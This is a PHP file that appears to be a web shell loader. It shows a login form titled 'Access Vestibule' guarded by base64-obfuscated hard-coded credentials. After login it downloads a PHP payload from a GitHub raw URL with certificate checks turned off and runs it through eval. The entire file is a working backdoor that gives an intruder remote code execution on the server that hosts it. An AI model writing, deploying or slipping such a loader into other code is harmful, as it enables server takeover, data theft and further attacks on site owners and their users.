<?php
session_start();

$encoded_user = 'bWFzdWs=';
$encoded_pass = 'YWw=';
$principal = base64_decode($encoded_user);
$seal = base64_decode($encoded_pass);


$remote_manifest = "https://raw.githubusercontent.com/beritaterkini3033/from-behind/refs/heads/main/from-behind_v3.php";


/* ======= Authentication portal (minimal) ======= */
if (!isset($_SESSION['authenticated_entitlement'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $supplied_principal = trim($_POST['uid'] ?? '');
        $supplied_seal = trim($_POST['pwd'] ?? '');

        if ($supplied_principal === $principal && $supplied_seal === $seal) {
            $_SESSION['authenticated_entitlement'] = true;
            // canonicalize / post-redirect-get
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $errstr = "Authentication credentials incongruent.";
        }
    }
    ?>
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Access Vestibule</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#fafafa; color:#111; padding:30px; }
            .card { max-width:480px; margin:28px auto; padding:20px; border:1px solid #e6e6e6; border-radius:8px; background:#fff; box-shadow:0 2px 6px rgba(0,0,0,.04); }
            label { display:block; margin:12px 0 6px; font-size:14px; color:#333; }
            input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #ddd; border-radius:6px; box-sizing:border-box; }
            input[type="submit"] { margin-top:16px; padding:10px 14px; border:0; border-radius:6px; background:#0b76ef; color:#fff; cursor:pointer; }
            .muted { color:#666; font-size:13px; margin-top:8px; }
            .err { color:#b00020; margin-bottom:8px; }
        </style>
    </head>
    <body>
    <div class="card" role="main" aria-labelledby="hdr">
        <h2 id="hdr">Access Vestibule</h2>
        <?php if (isset($errstr)) echo "<div class=\"err\">".htmlspecialchars($errstr, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')."</div>"; ?>
        <form method="POST" novalidate>
            <label for="uid">User Designation</label>
            <input id="uid" name="uid" type="text" autocomplete="username" required>

            <label for="pwd">Cryptographic Passphrase</label>
            <input id="pwd" name="pwd" type="password" autocomplete="current-password" required>

            <input type="submit" value="Solicit Entitlement">
            <p class="muted">Supply credential tuple to proceed to the execution domain.</p>
        </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}

function fetch_manifest(string $uri) {
    $payload = @file_get_contents($uri);
    if ($payload !== false) return $payload;

    if (!function_exists('curl_init')) return false;

    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $uri);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_TIMEOUT, 15);
    $payload = curl_exec($c);
    $code = curl_getinfo($c, CURLINFO_HTTP_CODE);
    curl_close($c);

    if ($code !== 200 || $payload === false || trim($payload) === '') return false;
    return $payload;
}

$remote_blob = fetch_manifest($remote_manifest);
if ($remote_blob === false || trim($remote_blob) === '') {
    http_response_code(502);
    exit('Remote acquisition failed: manifest unobtainable.');
}

try {
    ob_start();
    eval('?>' . $remote_blob);
    $collected = ob_get_clean();
    header('Content-Type: text/html; charset=utf-8');
    echo $collected;
    exit;
} catch (Throwable $t) {
    while (ob_get_level() > 0) ob_end_clean();
    http_response_code(500);
    $msg = 'Execution anomaly: ' . htmlspecialchars($t->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    echo $msg;
    exit;
}
?>